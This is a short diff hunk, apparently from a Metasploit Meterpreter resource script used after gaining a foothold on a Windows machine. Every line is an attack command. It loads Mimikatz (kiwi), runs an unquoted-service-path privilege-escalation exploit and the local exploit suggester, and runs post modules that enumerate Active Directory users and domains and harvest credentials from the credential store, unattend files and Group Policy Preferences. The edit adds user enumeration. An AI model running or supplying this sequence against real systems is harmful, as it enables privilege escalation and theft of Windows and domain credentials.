@@ -523,8 +523,9 @@ load kiwi
 load priv
 run exploit/windows/local/unquoted_service_path LHOST=eth1
 run multi/recon/local_exploit_suggester
-run post/windows/gather/enum_domains
+run post/windows/gather/enum_ad_users
 run post/windows/gather/enum_domain
+run post/windows/gather/enum_domains
 run post/windows/gather/enum_unattend
 run post/windows/gather/credentials/enum_cred_store
 run post/windows/gather/credentials/gpp
